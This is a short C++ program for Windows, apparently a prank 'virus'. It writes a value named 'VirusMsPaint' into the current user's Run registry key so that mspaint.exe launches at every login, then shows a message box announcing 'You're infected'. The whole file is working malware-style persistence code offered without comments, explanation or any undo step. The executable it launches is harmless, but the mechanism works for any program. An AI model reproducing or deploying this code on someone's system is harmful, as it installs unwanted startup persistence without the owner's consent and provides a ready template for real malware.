//#include "stdafx.h"
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

using namespace std;
int main()
{
	HKEY RunKey;
	LPCTSTR valueP = TEXT("VirusMsPaint");
	LPCTSTR data = TEXT("C:\\WINDOWS\\system32\\mspaint.exe");
	if (RegOpenKey(HKEY_CURRENT_USER,
		TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\RUN"), &RunKey) !=
		ERROR_SUCCESS)
	{
		cout << "Unable to open registry key. Exit.\n";
		return 0;
	}
	if (RegSetValueEx(RunKey, valueP, 0, REG_SZ, (LPBYTE)data,
		lstrlen(data) * sizeof(TCHAR)) != ERROR_SUCCESS)
	{
		RegCloseKey(RunKey);
		cout << "Unable to set the registry value. Exit.\n";
		return 0;
	}
	else
	{
		RegCloseKey(RunKey);
		cout << "Registry value is successfully set!\n";
		MessageBox(NULL, L"You're infected :-) I dare you to restart your machine!", L"Infection", MB_OKCANCEL);
	}
	return 0;
}

